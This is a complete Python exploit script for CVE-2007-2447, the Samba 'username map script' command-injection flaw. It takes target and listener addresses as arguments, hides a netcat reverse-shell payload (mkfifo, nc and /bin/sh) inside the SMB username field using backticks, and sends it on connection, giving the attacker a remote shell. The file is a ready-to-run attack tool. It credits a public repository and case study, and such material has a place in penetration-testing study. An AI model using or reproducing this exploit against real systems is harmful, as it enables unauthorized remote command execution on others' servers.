#!/usr/bin/python
# -*- coding: utf-8 -*-

# From : https://github.com/amriunix/cve-2007-2447
# Case study: https://amriunix.com/post/cve-2007-2447-samba-usermap-script/

import sys
import argparse
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
    payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
    username = "/=`nohup " + payload + "`"
    conn = SMBConnection(username, "", "", "")
    try:
        conn.connect(rhost, int(rport), timeout=1)
    except:
        print("[+] Payload was sent - check netcat!")

def main():
    print("[*] CVE-2007-2447 - Samba usermap script")

    parser = argparse.ArgumentParser(description="Samba CVE-2007-2447 Exploit")
    parser.add_argument("rhost", help="Target host (RHOST)")
    parser.add_argument("rport", help="Target port (RPORT)")
    parser.add_argument("lhost", help="Local host (LHOST)")
    parser.add_argument("lport", help="Local port (LPORT)")

    args = parser.parse_args()

    rhost = args.rhost
    rport = args.rport
    lhost = args.lhost
    lport = args.lport

    print("[+] Connecting to {}:{}".format(rhost, rport))
    exploit(rhost, rport, lhost, lport)

if __name__ == '__main__':
    main()
